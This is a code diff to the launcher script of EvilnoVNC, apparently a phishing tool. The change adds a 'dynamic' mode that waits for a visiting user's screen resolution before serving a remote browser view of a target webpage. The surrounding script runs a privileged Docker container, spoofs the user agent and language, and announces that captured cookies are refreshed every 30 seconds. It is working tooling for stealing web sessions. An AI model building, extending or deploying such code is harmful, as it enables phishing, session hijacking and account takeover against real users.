@@ -21,7 +21,9 @@ printf "\e[1;33mExamples:\n"
 printf "\e[1;32m\t1280x720  16bits: \e[1;0m./start.sh \e[1;35m1280x720x16 \e[1;34mhttp://example.com\n"
 printf "\e[1;32m\t1280x720  24bits: \e[1;0m./start.sh \e[1;35m1280x720x24 \e[1;34mhttp://example.com\n"
 printf "\e[1;32m\t1920x1080 16bits: \e[1;0m./start.sh \e[1;35m1920x1080x16 \e[1;34mhttp://example.com\n"
-printf "\e[1;32m\t1920x1080 24bits: \e[1;0m./start.sh \e[1;35m1920x1080x24 \e[1;34mhttp://example.com\n\n";}
+printf "\e[1;32m\t1920x1080 24bits: \e[1;0m./start.sh \e[1;35m1920x1080x24 \e[1;34mhttp://example.com\n\n"
+printf "\e[1;33mDynamic resolution:\n"
+printf "\e[1;0m\t./start.sh \e[1;35mdynamic \e[1;34mhttp://example.com\n\n";}
 
 if [[ $# -lt 2 ]] ; then help
 if [[ $# -lt 2 ]] ; then printf "\e[1;31m[!] Not enough parameters!\n\n"
@@ -36,7 +38,12 @@ if docker -v &> /dev/null ; then
 if ! (( $(ps -ef | grep -v grep | grep docker | wc -l) > 0 )) ; then
 sudo service docker start > /dev/null 2>&1 ; sleep 2 ; fi ; fi
 
+if [[ $RESOLUTION == dynamic ]]; then
+sudo rm -f /tmp/resolution.txt /tmp/client_info.txt
+else
 echo $RESOLUTION > /tmp/resolution.txt
+fi
+
 sudo docker run --cap-add=SYS_ADMIN -d --rm -p 80:80 --shm-size=2gb -v "/tmp:/tmp" \
 -v "${PWD}/Downloads":"/home/user/Downloads" -v "${PWD}/Files/kiosk.zip":"/home/user/kiosk.zip" \
 -e "WEBPAGE=$WEBPAGE" -e "USERAGENT=$USERAGENT" -e "CLIENT_LANG=$CLIENT_LANG" \
@@ -46,6 +53,12 @@ rm -Rf $PWD/Downloads/*
 printf "\n\e[1;33m[>] EvilnoVNC Server is running.." ; sleep 2
 printf "\n\e[1;34m[+] URL: http://localhost" ; sleep 2
 printf "\n\e[1;31m[!] Press Ctrl+C at any time to close!" ; sleep 2
+
+if [[ $RESOLUTION == dynamic ]]; then
+printf "\n\e[1;32m[+] Waiting for any user interaction.." ; sleep 2
+while [[ -z "$(cat /tmp/resolution.txt 2> /dev/null)" ]]; do sleep 1 ; done
+RESOLUTION=$(head -1 /tmp/resolution.txt)
+fi
 printf "\n\e[1;34m[+] Desktop Resolution: $RESOLUTION" ; sleep 2
 printf "\n\e[1;32m[+] Cookies will be updated every 30 seconds.. \e[1;31m"
 
